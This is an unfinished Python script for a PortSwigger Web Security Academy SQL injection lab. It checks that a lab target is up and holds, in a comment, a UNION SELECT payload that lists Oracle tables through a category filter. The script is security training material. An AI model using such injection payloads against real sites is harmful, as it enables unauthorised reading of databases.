# incomplete

import requests
import argparse
import bs4

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-08.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# /filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--
# USERS_
